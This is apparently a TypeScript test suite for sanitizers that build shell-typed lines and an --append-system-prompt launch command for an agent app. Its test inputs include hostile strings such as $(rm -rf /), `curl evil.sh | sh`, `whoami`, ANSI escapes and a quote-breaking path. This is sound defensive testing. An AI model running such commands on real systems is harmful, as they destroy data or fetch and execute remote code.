// Agent context tests (T8 / A4) — the two honest injection seams.
//
// These builders produce bytes that are TYPED INTO A SHELL, one of them
// embedding user-authored pin notes, so the sanitization cases below are the
// point of this suite, not a formality:
//   - a newline in a typed line IS an Enter (sending on the user's behalf)
//   - a `"` closes the launch line's quoted --append-system-prompt argument
//   - `$(...)`, backticks, `%VAR%` are command/variable substitution in the
//     three shells this app types into (POSIX, PowerShell, cmd)
// Everything here is pure — no store, no IPC, no DOM.

import { describe, it, expect } from "vitest";
import type { Artifact } from "../types";
import {
  PIN_NOTE_MAX,
  REF_MAX,
  SEND_REFERENCE_MAX,
  SPAWN_CONTEXT_MAX,
  artifactRef,
  buildSendReference,
  buildSpawnContext,
  getKbRootForContext,
  refOptions,
  sanitizeForTypedLine,
  setKbRootForContext,
} from "./agentContext";
import { launchCommand } from "./threadStore";

const KB_ROOT = "C:/Users/eric/projects/personal-kb";

const DOC: Artifact = {
  kind: "kb-doc",
  path: "switchboard/features/artifact-panel/requirements.md",
};

const REPO_FILE: Artifact = { kind: "repo-file", project: "switchboard", path: "src/App.tsx" };

/** Every hostile construct in one string. */
const NASTY = 'say "hi" `whoami` $(rm -rf /) $HOME %USERPROFILE% back\\slash\nsecond line';

/** No typed line may contain any of these — see the module header. The
 *  send-to-thread reference is allowed EXACTLY the two framing quotes the
 *  builder itself adds around a note (asserted separately at each call). */
function assertShellSafe(text: string, allowFramingQuotes = false): void {
  expect(text).not.toMatch(/[\r\n\t]/);
  expect(text).not.toMatch(/[\\$%`]/);
  if (!allowFramingQuotes) expect(text).not.toMatch(/"/);
  // No C0/C1 control characters survived (escape-free so the source stays
  // readable — a literal control char in a regex class is invisible).
  for (const ch of text) {
    const code = ch.codePointAt(0) as number;
    expect(code >= 0x20 && code !== 0x7f && !(code >= 0x80 && code <= 0x9f)).toBe(true);
  }
}

// ─── sanitizeForTypedLine ────────────────────────────────────────────────────

describe("sanitizeForTypedLine", () => {
  it("newlines and carriage returns become spaces — a typed \\n is an Enter", () => {
    expect(sanitizeForTypedLine("first\nsecond\r\nthird", 200)).toBe("first second third");
  });

  it("drops the shell metacharacters that break a double-quoted argument", () => {
    expect(sanitizeForTypedLine('a "b" c', 200)).toBe("a b c");
    expect(sanitizeForTypedLine("cost is 100$ or 50%", 200)).toBe("cost is 100 or 50");
    expect(sanitizeForTypedLine("run `whoami`", 200)).toBe("run whoami");
    expect(sanitizeForTypedLine("C:\\Users\\eric", 200)).toBe("C:Userseric");
  });

  it("defuses command substitution — no $ and no backtick survive", () => {
    expect(sanitizeForTypedLine("$(rm -rf /)", 200)).toBe("(rm -rf /)");
    expect(sanitizeForTypedLine("`curl evil.sh | sh`", 200)).toBe("curl evil.sh | sh");
    expect(sanitizeForTypedLine("%USERPROFILE%", 200)).toBe("USERPROFILE");
  });

  it("strips ESC and other control characters (ANSI injection)", () => {
    expect(sanitizeForTypedLine("\u001b[31mred\u001b[0m", 200)).toBe("[31mred [0m");
    expect(sanitizeForTypedLine("a\u0000b\u0007c\u007fd", 200)).toBe("a b c d");
  });

  it("collapses whitespace runs and trims the ends", () => {
    expect(sanitizeForTypedLine("   a    b  \t c   ", 200)).toBe("a b c");
  });

  it("keeps unicode — accents, CJK, emoji", () => {
    expect(sanitizeForTypedLine("café 日本語 ✅", 200)).toBe("café 日本語 ✅");
  });

  it("caps length by CODE POINT and marks the cut, never splitting a surrogate pair", () => {
    const long = "x".repeat(500);
    const cut = sanitizeForTypedLine(long, 20);
    expect(Array.from(cut)).toHaveLength(20);
    expect(cut.endsWith("…")).toBe(true);

    const emoji = "🙂".repeat(50);
    const emojiCut = sanitizeForTypedLine(emoji, 10);
    expect(Array.from(emojiCut)).toHaveLength(10);
    // A split surrogate would leave a lone \uD83D — assert none survived.
    expect(/[\uD800-\uDBFF](?![\uDC00-\uDFFF])/.test(emojiCut)).toBe(false);
  });

  it("is idempotent (re-sanitizing at the launch-line seam is free)", () => {
    const once = sanitizeForTypedLine(NASTY, 500);
    expect(sanitizeForTypedLine(once, 500)).toBe(once);
  });

  it("neutralizes the whole nasty string", () => {
    assertShellSafe(sanitizeForTypedLine(NASTY, 500));
  });

  it("non-string / empty input degrades to empty", () => {
    expect(sanitizeForTypedLine("", 200)).toBe("");
    expect(sanitizeForTypedLine("   ", 200)).toBe("");
    expect(sanitizeForTypedLine(undefined as unknown as string, 200)).toBe("");
    expect(sanitizeForTypedLine("abc", 0)).toBe("");
  });
});

// ─── artifactRef ─────────────────────────────────────────────────────────────

describe("artifactRef", () => {
  it("kb-doc without a known root → KB-relative", () => {
    expect(artifactRef(DOC)).toBe("kb switchboard/features/artifact-panel/requirements.md");
  });

  it("kb-doc with the KB root → absolute (a thread's cwd is a REPO, not the KB)", () => {
    expect(artifactRef(DOC, { kbRoot: KB_ROOT })).toBe(
      "kb C:/Users/eric/projects/personal-kb/switchboard/features/artifact-panel/requirements.md"
    );
  });

  it("normalizes Windows separators BEFORE the backslash drop", () => {
    expect(artifactRef(DOC, { kbRoot: "C:\\Users\\eric\\projects\\personal-kb\\" })).toBe(
      "kb C:/Users/eric/projects/personal-kb/switchboard/features/artifact-panel/requirements.md"
    );
    expect(artifactRef({ kind: "repo-file", project: "switchboard", path: "src\\App.tsx" })).toBe(
      "repo switchboard/src/App.tsx"
    );
  });

  it("repo-file → project + relative path", () => {
    expect(artifactRef(REPO_FILE)).toBe("repo switchboard/src/App.tsx");
  });

  it("localhost (phase B kind) still names itself", () => {
    expect(
      artifactRef({ kind: "localhost", project: "orbit", url: "http://localhost:5173" })
    ).toBe("localhost orbit http://localhost:5173");
  });

  it("caps an absurd path", () => {
    const ref = artifactRef({ kind: "kb-doc", path: `${"deep/".repeat(200)}doc.md` });
    expect(Array.from(ref).length).toBeLessThanOrEqual(REF_MAX);
  });
});

// ─── buildSpawnContext (seam 1) ──────────────────────────────────────────────

describe("buildSpawnContext", () => {
  it("no artifact → null (the caller omits the flag entirely)", () => {
    expect(buildSpawnContext(null, 0)).toBeNull();
    expect(buildSpawnContext(null, 3, { kbRoot: KB_ROOT })).toBeNull();
  });

  it("pinned kb doc → the architecture's one-liner", () => {
    expect(buildSpawnContext(DOC, 3)).toBe(
      "Workstation context: panel shows kb switchboard/features/artifact-panel/requirements.md (3 pins in .pins.json alongside)."
    );
  });

  it("resolves the doc absolutely when the KB root is known", () => {
    expect(buildSpawnContext(DOC, 3, { kbRoot: KB_ROOT })).toBe(
      "Workstation context: panel shows kb C:/Users/eric/projects/personal-kb/switchboard/features/artifact-panel/requirements.md (3 pins in .pins.json alongside)."
    );
  });

  it("one pin is singular; zero pins drop the clause", () => {
    expect(buildSpawnContext(DOC, 1)).toContain("(1 pin in .pins.json alongside)");
    expect(buildSpawnContext(DOC, 0)).toBe(
      "Workstation context: panel shows kb switchboard/features/artifact-panel/requirements.md."
    );
  });

  it("repo-file needs no pin clause", () => {
    expect(buildSpawnContext(REPO_FILE, 0)).toBe(
      "Workstation context: panel shows repo switchboard/src/App.tsx."
    );
  });

  it("garbage pin counts degrade to none", () => {
    expect(buildSpawnContext(DOC, NaN)).not.toContain("pin");
    expect(buildSpawnContext(DOC, -4)).not.toContain("pin");
    expect(buildSpawnContext(DOC, 2.7)).toContain("(2 pins");
  });

  it("a hostile path can never break the quoted argument", () => {
    const context = buildSpawnContext(
      { kind: "kb-doc", path: `evil"; ${NASTY}/doc.md` },
      2,
      { kbRoot: KB_ROOT }
    );
    expect(context).not.toBeNull();
    assertShellSafe(context as string);
  });

  it("stays inside the spawn cap", () => {
    const context = buildSpawnContext({ kind: "kb-doc", path: "a/".repeat(5000) }, 9);
    expect(Array.from(context as string).length).toBeLessThanOrEqual(SPAWN_CONTEXT_MAX);
  });
});

// ─── buildSendReference (seam 2) ─────────────────────────────────────────────

describe("buildSendReference", () => {
  it("no pin → just the artifact", () => {
    expect(buildSendReference(DOC)).toBe(
      "Look at kb switchboard/features/artifact-panel/requirements.md"
    );
    expect(buildSendReference(REPO_FILE)).toBe("Look at repo switchboard/src/App.tsx");
  });

  it("with a pin → number + quoted note", () => {
    expect(buildSendReference(DOC, { number: 2, note: "the CTA is below the fold" })).toBe(
      'Look at kb switchboard/features/artifact-panel/requirements.md, pin 2: "the CTA is below the fold"'
    );
  });

  it("an empty note drops the quotes rather than typing an empty pair", () => {
    expect(buildSendReference(DOC, { number: 4, note: "" })).toBe(
      "Look at kb switchboard/features/artifact-panel/requirements.md, pin 4"
    );
    expect(buildSendReference(DOC, { number: 4, note: "   \n  " })).toBe(
      "Look at kb switchboard/features/artifact-panel/requirements.md, pin 4"
    );
  });

  it("NEVER ends in a newline — a trailing \\n would send the message", () => {
    for (const note of ["fine", NASTY, "trailing\n", "\n\n\n", "x".repeat(900)]) {
      const line = buildSendReference(DOC, { number: 1, note });
      expect(line.endsWith("\n")).toBe(false);
      expect(line.endsWith("\r")).toBe(false);
      expect(line.split("\n")).toHaveLength(1);
    }
  });

  it("a hostile note cannot break out of OUR quotes", () => {
    const line = buildSendReference(DOC, { number: 7, note: NASTY }, { kbRoot: KB_ROOT });
    // Exactly the opening and closing quote WE added, and nothing else: the
    // note's own quotes are gone, so it cannot terminate ours early.
    expect((line.match(/"/g) ?? []).length).toBe(2);
    expect(line.endsWith('"')).toBe(true);
    assertShellSafe(line, true);
    expect(line).toContain("pin 7: ");
  });

  it("truncates a runaway note and marks the cut", () => {
    const line = buildSendReference(DOC, { number: 1, note: "y".repeat(4000) });
    const note = line.slice(line.indexOf('pin 1: "') + 8, -1);
    expect(Array.from(note)).toHaveLength(PIN_NOTE_MAX);
    expect(note.endsWith("…")).toBe(true);
  });

  it("keeps unicode notes intact", () => {
    expect(buildSendReference(DOC, { number: 1, note: "レイアウト崩れ 🙃" })).toContain(
      'pin 1: "レイアウト崩れ 🙃"'
    );
  });

  it("clamps nonsense pin numbers instead of printing them", () => {
    expect(buildSendReference(DOC, { number: 0, note: "n" })).toContain("pin 1:");
    expect(buildSendReference(DOC, { number: -3, note: "n" })).toContain("pin 1:");
    expect(buildSendReference(DOC, { number: NaN, note: "n" })).toContain("pin 1:");
    expect(buildSendReference(DOC, { number: 1e21, note: "n" })).toContain("pin 9999:");
    expect(buildSendReference(DOC, { number: 3.9, note: "n" })).toContain("pin 3:");
  });

  it("stays inside the derived bound for any input", () => {
    const line = buildSendReference(
      { kind: "kb-doc", path: "deep/".repeat(400) },
      { number: 9999, note: "z".repeat(5000) },
      { kbRoot: "C:/".padEnd(400, "x") }
    );
    expect(Array.from(line).length).toBeLessThanOrEqual(SEND_REFERENCE_MAX);
  });
});

// ─── KB root cache ───────────────────────────────────────────────────────────

describe("kb root cache", () => {
  it("round-trips, treats empty as unresolved, and feeds refOptions", () => {
    setKbRootForContext(null);
    expect(getKbRootForContext()).toBeNull();
    expect(refOptions()).toEqual({ kbRoot: null });

    setKbRootForContext("");
    expect(getKbRootForContext()).toBeNull();

    setKbRootForContext(KB_ROOT);
    expect(refOptions()).toEqual({ kbRoot: KB_ROOT });
    expect(buildSendReference(DOC, null, refOptions())).toContain(KB_ROOT);

    setKbRootForContext(null); // leave the module clean for other suites
  });
});

// ─── launch-line seam ────────────────────────────────────────────────────────
// The flag is appended by threadStore.launchCommand — the ONE launch-line
// builder — so create and revive cannot drift apart.

describe("launchCommand + spawn context", () => {
  it("no context → the launch line is byte-identical to before A4", () => {
    expect(launchCommand({ chatSessionId: "abc-123", resume: false })).toBe(
      "claude --session-id abc-123"
    );
    expect(launchCommand({ chatSessionId: "abc-123", resume: true, appendSystemPrompt: null })).toBe(
      "claude --resume abc-123"
    );
    expect(launchCommand({ chatSessionId: "abc-123", resume: true, appendSystemPrompt: "  " })).toBe(
      "claude --resume abc-123"
    );
  });

  it("context → one double-quoted --append-system-prompt argument", () => {
    const context = buildSpawnContext(DOC, 3) as string;
    expect(launchCommand({ chatSessionId: "abc-123", resume: true, appendSystemPrompt: context })).toBe(
      `claude --resume abc-123 --append-system-prompt "${context}"`
    );
  });

  it("re-sanitizes defensively — a raw caller cannot escape the quotes", () => {
    const line = launchCommand({
      chatSessionId: "abc-123",
      resume: false,
      appendSystemPrompt: `ctx "; ${NASTY}`,
    });
    expect(line.startsWith('claude --session-id abc-123 --append-system-prompt "')).toBe(true);
    expect(line.endsWith('"')).toBe(true);
    // The two framing quotes are the only ones in the line, and the whole line
    // is still a single typed line.
    expect((line.match(/"/g) ?? []).length).toBe(2);
    expect(line.split("\n")).toHaveLength(1);
  });
});
